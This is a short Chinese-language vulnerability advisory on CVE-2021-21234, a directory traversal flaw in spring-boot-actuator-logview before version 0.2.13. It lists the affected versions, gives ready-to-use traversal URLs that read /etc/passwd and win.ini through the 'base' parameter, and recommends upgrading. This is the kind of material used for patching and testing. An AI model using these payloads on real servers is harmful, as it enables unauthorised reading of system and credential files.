# Spring Boot 目录遍历 CVE-2021-21234

## 漏洞描述

spring-boot-actuator-logview 是一个简单的日志文件查看器，在 0.2.13 版本之前存在目录遍历漏洞。

## 漏洞影响

```
spring-boot-actuator-logview < 0.2.13
```

## 漏洞复现

Windows：

```
http://<your-ip>/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../ 
http://<your-ip>/log/view?filename=/windows/win.ini&base=../../../../../../../../../../ 
```

Linux：

```
http://<your-ip>/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
http://<your-ip>/log/view?filename=/etc/passwd&base=../../../../../../../../../../
```

## 漏洞修复

将 spring-boot-actuator-logview 升级到 0.2.13 及以上版本。
